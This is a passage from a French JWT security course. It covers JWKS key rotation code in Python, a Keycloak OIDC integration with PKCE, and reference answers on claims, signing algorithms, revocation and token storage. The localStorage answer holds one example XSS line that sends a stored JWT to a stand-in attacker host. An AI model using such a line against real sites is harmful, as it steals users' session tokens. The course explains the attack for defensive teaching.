    print("❌ ERREUR : aurait dû bloquer")
except Exception as e:
    print(f"✅ Attaque bloquée : {e}")
```

---

## Exercice 5 — JWKS Endpoint avec Rotation de Clés

### Objectif
Implémenter un endpoint JWKS complet qui supporte la rotation de clés sans interruption de service.

```python
# jwks_server.py
"""
Exercice 5 — JWKS endpoint avec rotation de clés RSA.
Dépendances : pip install fastapi cryptography uvicorn
"""

import uuid
import time
import base64
from typing import Dict, List
from dataclasses import dataclass, field
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend
from fastapi import FastAPI
import jwt

def int_to_base64url(n: int) -> str:
    length = (n.bit_length() + 7) // 8
    return base64.urlsafe_b64encode(n.to_bytes(length, 'big')).rstrip(b'=').decode()

@dataclass
class ManagedKey:
    kid: str
    private_key: rsa.RSAPrivateKey
    created_at: float
    status: str = "active"   # active | retiring | retired

    @property
    def public_key(self):
        return self.private_key.public_key()

    def to_jwk(self) -> dict:
        pub_numbers = self.public_key.public_key().public_numbers() \
            if hasattr(self.public_key, 'public_key') else self.public_key.public_numbers()
        return {
            "kty": "RSA",
            "use": "sig",
            "alg": "RS256",
            "kid": self.kid,
            "n": int_to_base64url(pub_numbers.n),
            "e": int_to_base64url(pub_numbers.e),
            # Jamais exposer "d" (clé privée) dans le JWKS public !
        }

class KeyManager:
    """
    Gestionnaire de clés avec rotation automatique.
    Stratégie :
      - Une clé "active" pour signer les nouveaux tokens
      - Les clés "retiring" restent dans le JWKS pour vérifier les tokens existants
      - Les clés "retired" sont supprimées après max_age
    """

    def __init__(self, max_age_seconds: int = 86400 * 90):  # 90 jours
        self.keys: Dict[str, ManagedKey] = {}
        self.max_age = max_age_seconds
        # Générer la première clé au démarrage
        self._generate_key()

    def _generate_key(self) -> ManagedKey:
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        kid = f"key-{str(uuid.uuid4())[:8]}"
        key = ManagedKey(
            kid=kid,
            private_key=private_key,
            created_at=time.time(),
            status="active"
        )
        self.keys[kid] = key
        print(f"🔑 Nouvelle clé générée : {kid}")
        return key

    @property
    def active_key(self) -> ManagedKey:
        """La clé courante pour signer les nouveaux tokens."""
        active = [k for k in self.keys.values() if k.status == "active"]
        if not active:
            return self._generate_key()
        return active[0]

    def rotate(self):
        """
        Rotation des clés :
        1. L'ancienne clé active passe en "retiring" (reste dans JWKS)
        2. Une nouvelle clé active est générée
        3. Les clés trop vieilles sont retirées du JWKS
        """
        print(f"\n🔄 Rotation des clés en cours...")

        # Passer la clé active en "retiring"
        for key in self.keys.values():
            if key.status == "active":
                key.status = "retiring"
                print(f"   {key.kid} → retiring (tokens existants encore vérifiables)")

        # Générer une nouvelle clé active
        new_key = self._generate_key()
        print(f"   {new_key.kid} → active (nouveaux tokens signés avec cette clé)")

        # Retirer les clés trop vieilles (tokens associés forcément expirés)
        now = time.time()
        to_remove = [
            kid for kid, key in self.keys.items()
            if key.status == "retiring" and (now - key.created_at) > self.max_age
        ]
        for kid in to_remove:
            del self.keys[kid]
            print(f"   {kid} → retiré du JWKS")

    def get_jwks(self) -> dict:
        """Retourne toutes les clés publiques (active + retiring)."""
        return {
            "keys": [
                key.to_jwk()
                for key in self.keys.values()
                if key.status in ("active", "retiring")
            ]
        }

    def sign_jwt(self, payload: dict) -> str:
        """Signe un JWT avec la clé active, en incluant le kid dans le header."""
        active = self.active_key
        private_pem = active.private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        )
        return jwt.encode(
            payload,
            private_pem,
            algorithm="RS256",
            headers={"kid": active.kid}
        )

    def verify_jwt(self, token: str) -> dict:
        """Vérifie un JWT en choisissant la bonne clé depuis le kid."""
        unverified_header = jwt.get_unverified_header(token)
        kid = unverified_header.get("kid")

        if not kid or kid not in self.keys:
            raise ValueError(f"Clé inconnue : {kid}")

        key = self.keys[kid]
        public_pem = key.public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

        return jwt.decode(token, public_pem, algorithms=["RS256"])

# ══════════════════════════════════════════════
# API FastAPI
# ══════════════════════════════════════════════

app   = FastAPI(title="JWKS Server — Exercice JWT")
manager = KeyManager()

@app.get("/.well-known/jwks.json")
async def jwks_endpoint():
    """Endpoint JWKS public — exposé sans auth."""
    return manager.get_jwks()

@app.post("/sign")
async def sign_token(payload: dict):
    """Signe un payload en JWT (endpoint de test)."""
    import time
    payload["iat"] = int(time.time())
    payload["exp"] = int(time.time()) + 3600
    token = manager.sign_jwt(payload)
    return {"token": token, "kid": manager.active_key.kid}

@app.post("/verify")
async def verify_token(body: dict):
    """Vérifie un JWT."""
    try:
        payload = manager.verify_jwt(body["token"])
        return {"valid": True, "payload": payload}
    except Exception as e:
        return {"valid": False, "error": str(e)}

@app.post("/admin/rotate-keys")
async def rotate_keys():
    """Déclenche une rotation de clés (en prod : cron automatique)."""
    manager.rotate()
    return {"keys": manager.get_jwks()}

# ══════════════════════════════════════════════
# Test de la rotation
# ══════════════════════════════════════════════

if __name__ == "__main__":
    print("=" * 60)
    print("TEST : Rotation de clés sans interruption")
    print("=" * 60)
    import time

    # 1. Signer avec la clé initiale
    payload = {"sub": "user_42", "iat": int(time.time()), "exp": int(time.time()) + 3600}
    old_token = manager.sign_jwt(payload)
    old_kid   = manager.active_key.kid
    print(f"\nToken signé avec clé {old_kid}")

    # 2. Vérifier avant rotation
    result = manager.verify_jwt(old_token)
    print(f"✅ Vérification avant rotation : {result['sub']}")

    # 3. Rotation
    manager.rotate()
    new_kid = manager.active_key.kid
    print(f"\nNouvelle clé active : {new_kid}")

    # 4. Vérifier l'ancien token (doit encore fonctionner — clé en "retiring")
    result = manager.verify_jwt(old_token)
    print(f"✅ Ancien token toujours valide après rotation : {result['sub']}")

    # 5. Nouveau token signé avec la nouvelle clé
    new_token = manager.sign_jwt(payload)
    result    = manager.verify_jwt(new_token)
    print(f"✅ Nouveau token valide : {result['sub']}")

    # 6. JWKS contient les deux clés
    jwks = manager.get_jwks()
    print(f"\nJWKS expose {len(jwks['keys'])} clé(s) :")
    for key in jwks['keys']:
        status = next(k.status for k in manager.keys.values() if k.kid == key['kid'])
        print(f"  - {key['kid']} ({status})")
```

---

## Exercice 6 — Intégration OIDC avec Keycloak en Local

### Objectif
Intégrer un provider OIDC réel (Keycloak) dans une application.

### Mise en place de Keycloak avec Docker

```bash
# Lancer Keycloak en mode développement
docker run -d \
  --name keycloak-dev \
  -p 8080:8080 \
  -e KEYCLOAK_ADMIN=admin \
  -e KEYCLOAK_ADMIN_PASSWORD=admin \
  quay.io/keycloak/keycloak:latest start-dev

# Accéder à l'admin console
open http://localhost:8080/admin
```

### Configuration Keycloak (script automatisé)

```bash
# Script shell pour configurer Keycloak via CLI
KC_URL="http://localhost:8080"
REALM="exercice-jwt"

# Authentification admin
TOKEN=$(curl -s -X POST "$KC_URL/realms/master/protocol/openid-connect/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=admin&grant_type=password&client_id=admin-cli" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# Créer le realm
curl -s -X POST "$KC_URL/admin/realms" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "realm": "exercice-jwt",
    "enabled": true,
    "sslRequired": "none",
    "accessTokenLifespan": 900,
    "refreshTokenMaxReuse": 0
  }'

# Créer un client confidentiel (backend API)
curl -s -X POST "$KC_URL/admin/realms/$REALM/clients" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "clientId": "mon-api",
    "enabled": true,
    "publicClient": false,
    "standardFlowEnabled": true,
    "directAccessGrantsEnabled": false,
    "serviceAccountsEnabled": true,
    "redirectUris": ["http://localhost:8000/*"],
    "webOrigins": ["http://localhost:8000"]
  }'

# Créer un utilisateur de test
curl -s -X POST "$KC_URL/admin/realms/$REALM/users" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "testuser",
    "email": "test@monapp.com",
    "enabled": true,
    "credentials": [{"type":"password","value":"password123","temporary":false}]
  }'

echo "Keycloak configuré ! Discovery : $KC_URL/realms/$REALM/.well-known/openid-configuration"
```

### Intégration Python — vérification des tokens Keycloak

```python
# keycloak_integration.py
"""
Exercice 6 — Intégration OIDC Keycloak.
Dépendances : pip install httpx PyJWT cryptography python-multipart fastapi uvicorn
"""

import hashlib
import secrets
import base64
import httpx
from fastapi import FastAPI, HTTPException, Query
from fastapi.responses import RedirectResponse
from jwt import PyJWKClient
import jwt

KEYCLOAK_URL  = "http://localhost:8080"
REALM         = "exercice-jwt"
CLIENT_ID     = "mon-api"
CLIENT_SECRET = "VOTRE_CLIENT_SECRET"   # depuis admin console → Clients → Credentials
REDIRECT_URI  = "http://localhost:8000/auth/callback"

DISCOVERY_URL = f"{KEYCLOAK_URL}/realms/{REALM}/.well-known/openid-configuration"
JWKS_URL      = f"{KEYCLOAK_URL}/realms/{REALM}/protocol/openid-connect/certs"

app = FastAPI(title="OIDC Integration — Keycloak")

# Cache de la configuration OIDC
_oidc_config = None
async def get_oidc_config() -> dict:
    global _oidc_config
    if not _oidc_config:
        async with httpx.AsyncClient() as client:
            resp = await client.get(DISCOVERY_URL)
            _oidc_config = resp.json()
    return _oidc_config

# Client JWKS avec cache
jwks_client = PyJWKClient(JWKS_URL, cache_jwk_set=True, lifespan=3600)

# Stockage des états PKCE en mémoire (utiliser Redis en production)
_pkce_states: dict[str, str] = {}

def generate_pkce() -> tuple[str, str, str]:
    """Génère code_verifier, code_challenge et state."""
    state         = secrets.token_urlsafe(32)
    code_verifier = secrets.token_urlsafe(64)
    digest        = hashlib.sha256(code_verifier.encode()).digest()
    code_challenge = base64.urlsafe_b64encode(digest).rstrip(b'=').decode()
    return state, code_verifier, code_challenge

@app.get("/login")
async def login():
    """Démarre le flux Authorization Code + PKCE."""
    config = await get_oidc_config()
    state, code_verifier, code_challenge = generate_pkce()

    # Stocker le verifier pour la callback
    _pkce_states[state] = code_verifier

    params = {
        "response_type": "code",
        "client_id": CLIENT_ID,
        "redirect_uri": REDIRECT_URI,
        "scope": "openid profile email",
        "state": state,
        "code_challenge": code_challenge,
        "code_challenge_method": "S256",
        "nonce": secrets.token_urlsafe(16),
    }

    url = config["authorization_endpoint"] + "?" + "&".join(
        f"{k}={v}" for k, v in params.items()
    )
    return RedirectResponse(url)

@app.get("/auth/callback")
async def callback(code: str = Query(...), state: str = Query(...)):
    """Reçoit le code d'autorisation et l'échange contre des tokens."""
    # Récupérer le code_verifier
    code_verifier = _pkce_states.pop(state, None)
    if not code_verifier:
        raise HTTPException(status_code=400, detail="State invalide — possible CSRF")

    config = await get_oidc_config()

    # Échanger le code contre des tokens
    async with httpx.AsyncClient() as client:
        response = await client.post(
            config["token_endpoint"],
            data={
                "grant_type": "authorization_code",
                "code": code,
                "redirect_uri": REDIRECT_URI,
                "client_id": CLIENT_ID,
                "client_secret": CLIENT_SECRET,
                "code_verifier": code_verifier,
            }
        )

    if response.status_code != 200:
        raise HTTPException(status_code=400, detail=f"Token exchange failed: {response.text}")

    tokens = response.json()

    # Vérifier l'ID Token
    id_token = tokens["id_token"]
    signing_key = jwks_client.get_signing_key_from_jwt(id_token)

    id_payload = jwt.decode(
        id_token,
        signing_key.key,
        algorithms=["RS256"],
        audience=CLIENT_ID,
        issuer=f"{KEYCLOAK_URL}/realms/{REALM}",
        options={"leeway": 30},
    )

    return {
        "message": "Authentification réussie",
        "user": {
            "sub":   id_payload["sub"],
            "email": id_payload.get("email"),
            "name":  id_payload.get("name"),
        },
        "id_token_claims": id_payload,
        "access_token": tokens["access_token"][:50] + "...",
    }

@app.get("/verify")
async def verify_token(token: str = Query(...)):
    """Vérifie un access token Keycloak."""
    try:
        signing_key = jwks_client.get_signing_key_from_jwt(token)
        payload = jwt.decode(
            token,
            signing_key.key,
            algorithms=["RS256"],
            options={"verify_aud": False},  # Keycloak access tokens n'ont pas d'aud fixe
            issuer=f"{KEYCLOAK_URL}/realms/{REALM}",
        )
        return {"valid": True, "payload": payload}
    except Exception as e:
        raise HTTPException(status_code=401, detail=str(e))
```

### Vérification du Discovery Document

```bash
# Inspecter la configuration OIDC de Keycloak
curl -s http://localhost:8080/realms/exercice-jwt/.well-known/openid-configuration | python3 -m json.tool

# Clés publiques JWKS
curl -s http://localhost:8080/realms/exercice-jwt/protocol/openid-connect/certs | python3 -m json.tool

# Token via Client Credentials (M2M)
curl -X POST http://localhost:8080/realms/exercice-jwt/protocol/openid-connect/token \
  -d "grant_type=client_credentials&client_id=mon-api&client_secret=VOTRE_SECRET" \
  | python3 -c "import sys,json; t=json.load(sys.stdin)['access_token']; print(t)"
```

---

## Questions de Vérification — Réponses de Référence

---

### Q1 — Quelle est la différence entre `iss` et `aud`, et pourquoi les valider ?

**`iss` (Issuer)** identifie qui a **émis** le token. C'est la déclaration d'origine.
**`aud` (Audience)** identifie qui est **autorisé à consommer** le token. C'est la déclaration de destination.

```
Analogie physique :
  iss = le tampon "Mairie de Cotonou" sur un document officiel
  aud = le champ "destinataire" sur une lettre recommandée

Un document émis par la mairie de Cotonou (iss) peut être destiné
au Tribunal de Première Instance (aud) — pas à n'importe qui.
```

**Pourquoi valider `iss` :**
Si deux services partagent un secret ou une clé publique, un token émis par le Service A (pour ses propres besoins internes) pourrait être accepté par le Service B. Valider `iss` garantit que le token provient de l'autorité attendue.

**Pourquoi valider `aud` :**
Un token émis pour `service-orders` ne doit pas être accepté par `service-payments`. Sans validation `aud`, un token volé destiné à un service moins critique peut être réutilisé sur un service critique. C'est une protection contre le **token substitution attack**.

```python
# Les deux validations sont obligatoires et complémentaires
jwt.decode(
    token,
    key,
    algorithms=["RS256"],
    issuer="https://auth.monapp.com",      # qui a émis ? (iss)
    audience="https://api.monapp.com",     # pour qui ? (aud)
)
```

---

### Q2 — Quand utiliser HMAC (HS256) vs RSA (RS256) ?

| Critère | HS256 | RS256 |
|---------|-------|-------|
| **Type** | Symétrique — même clé pour signer et vérifier | Asymétrique — clé privée signe, publique vérifie |
| **Secret partagé** | Requis entre émetteur et vérificateur | Clé privée reste secrète, publique distribuée librement |
| **Microservices** | ⚠️ Tous les services doivent avoir le secret → surface d'attaque élargie | ✓ Services vérifient avec clé publique seulement |
| **Performances** | Plus rapide | Plus lent (opération RSA) |
| **Rotation de clés** | Coordination requise entre tous les services | Rotation de la clé privée, JWKS mis à jour |
| **Audit** | Impossible de prouver qui a émis (tout service avec le secret peut signer) | Seul le détenteur de la clé privée peut signer → non-répudiation |

**Règle de décision :**

```
HS256 si :
  → Monolithe ou application simple (un seul service vérifie)
  → Secret JAMAIS partagé au-delà d'un service
  → Performances critiques

RS256 si :
  → Microservices (plusieurs services vérifient)
  → Clé publique exposée via JWKS (IdP externe, OIDC)
  → Non-répudiation requise (audit, conformité)
  → C'est le standard dès que le périmètre dépasse un seul service
```

---

### Q3 — Comment révoquer un JWT sans base de données ?

La réponse directe : **on ne peut pas révoquer un JWT sans aucun état**. C'est une limitation fondamentale du design stateless.

Mais on peut **minimiser l'état nécessaire** :

**Approche 1 — Short TTL (aucun état)**
```
Access token de 5 minutes.
Révocation effective en 5 minutes maximum.
Acceptable pour des cas non-critiques.
```

**Approche 2 — Blacklist minimale (état très réduit)**
```
Stocker uniquement les jti des tokens révoqués dans Redis.
TTL Redis = TTL du token → auto-purge.
En pratique : quelques Ko à quelques Mo selon le trafic.
```

**Approche 3 — Token versioning (un entier par user)**
```
claim "ver" dans le token = numéro de version de la session.
Un seul entier en DB par utilisateur.
Incrémenter = invalide TOUS les tokens antérieurs.
Lookup DB à chaque requête (perd le stateless, mais minimal).
```

**Approche 4 — Combinaison optimale (production)**
```
Access token 15 min → tolérance à la compromission limitée
Refresh token avec jti blacklist → révocation complète via logout
Token versioning → "déconnecter tous les appareils"
```

La vraie réponse pour un système de production : on choisit le compromis stateless/révocabilité selon le niveau de risque accepté. Un système bancaire tolère moins qu'un blog.

---

### Q4 — Quels claims sont obligatoires ? Lesquels sont recommandés ?

**Selon la RFC 7519, aucun claim n'est techniquement obligatoire.** La spec les définit tous comme optionnels. Mais en pratique de production :

**Obligatoires (impératif applicatif) :**

| Claim | Pourquoi obligatoire |
|-------|---------------------|
| `exp` | Sans expiration, le token est valide à vie — inacceptable |
| `sub` | Identifier le sujet est le but premier du token |
| `iat` | Nécessaire pour les audits, la détection d'anomalies |
| `jti` | Nécessaire pour la révocation individuelle |

**Fortement recommandés :**

| Claim | Pourquoi recommandé |
|-------|---------------------|
| `iss` | Valider l'origine, défense en profondeur |
| `aud` | Prévenir la substitution de token entre services |
| `nbf` | Utile pour les tokens à émission anticipée (refresh) |

**Optionnels selon le contexte :**

| Claim | Quand l'ajouter |
|-------|----------------|
| `role` / `scope` | Autorisation fine dans le token |
| `ver` | Si token versioning pour révocation globale |
| `email`, `name` | Si l'application en a besoin sans appel UserInfo |

**Règle pratique :**
```python
# Claims minimum viable pour un système de production
{
    "sub": user_id,          # obligatoire
    "exp": now + 15min,      # obligatoire
    "iat": now,              # obligatoire pour audit
    "jti": uuid4(),          # obligatoire pour révocation
    "iss": JWT_ISSUER,       # fortement recommandé
    "aud": JWT_AUDIENCE,     # fortement recommandé
}
```

---

### Q5 — Pourquoi `localStorage` est dangereux pour stocker un JWT ?

`localStorage` est accessible à **tout JavaScript exécuté sur le domaine**, sans exception.

**Vecteur d'attaque — XSS :**

```javascript
// Un script XSS injecté n'importe où sur la page peut faire :
fetch("https://attacker.com/steal?t=" + localStorage.getItem("jwt"))
// → le token est exfiltré. HTTPS ne protège pas (c'est le JS légitime qui envoie).
```

**Sources de XSS souvent sous-estimées :**
- Script NPM compromis dans votre bundle (supply chain attack)
- Extension navigateur malveillante de l'utilisateur
- Commentaire utilisateur non sanitisé affiché en HTML
- Iframe cross-origin avec `document.domain` mal configuré
- CDN externe compromis (`<script src="cdn.tiers.com/lib.js">`)

**Comparaison des surfaces d'attaque :**

```
localStorage          : Lisible par TOUT JavaScript du domaine → XSS = game over
sessionStorage        : Même problème, vidé au fermeture onglet seulement
Cookie non-httpOnly   : Lisible par JavaScript → même problème
Cookie httpOnly       : ✓ Inaccessible au JavaScript, même en cas de XSS
Mémoire JS (variable) : ✓ Inaccessible hors de la closure, perdue au refresh
```

**La défense correcte :**

```
Access token  → variable JS en mémoire (perdue au refresh → utilisez le refresh token)
Refresh token → cookie httpOnly + Secure + SameSite=Strict

httpOnly → JavaScript ne peut pas lire le cookie, même en XSS
Secure   → transmis uniquement via HTTPS
SameSite → bloque l'envoi automatique depuis un site tiers (protection CSRF)
```

**Résumé :**
`localStorage` sacrifie la sécurité pour la commodité. Un XSS quelconque — même dans une dépendance de dépendance — donne accès complet au token. Pour des données qui doivent rester valides plusieurs minutes (access token) ou jours (refresh token), cookie `httpOnly` est le seul stockage sérieux côté navigateur.

---

## Tableau de Synthèse Final

| Thème | Question clé | Réponse en une ligne |
|-------|-------------|---------------------|
| `iss` vs `aud` | Qui signe ? Pour qui ? | `iss` = origine, `aud` = destinataire — valider les deux toujours |
| HS256 vs RS256 | Mono-service ou distribué ? | HS256 si tout reste dans un service, RS256 dès qu'il y a un JWKS |
| Révocation | Sans état ? | Impossible purement ; combiner court TTL + jti blacklist Redis |
| Claims | Lesquels mettre ? | `sub`, `exp`, `iat`, `jti` obligatoires ; `iss`, `aud` fortement recommandés |
| Stockage | localStorage ? | Jamais en production — cookie `httpOnly + Secure + SameSite` |
| alg:none | Pourquoi dangereux ? | Contourne toute vérification de signature |
| Rotation | Comment sans coupure ? | JWKS avec clé active + clé retiring ; `kid` dans le header |
| JWE vs JWS | Chiffrer ou signer ? | JWS = intégrité, JWE = confidentialité ; données sensibles → JWE |
| PKCE | Pourquoi pour les SPAs ? | Pas de client_secret côté navigateur — PKCE remplace sans secret |
| clockSkew | Pourquoi une tolérance ? | Horloges serveurs rarement parfaitement synchronisées (NTP drift) |

---

*Fin du cours JSON Web Tokens — 8 étapes complètes.*
*De la structure de base à l'exploitation de vulnérabilités, en passant par les standards RFC et les architectures Zero Trust.*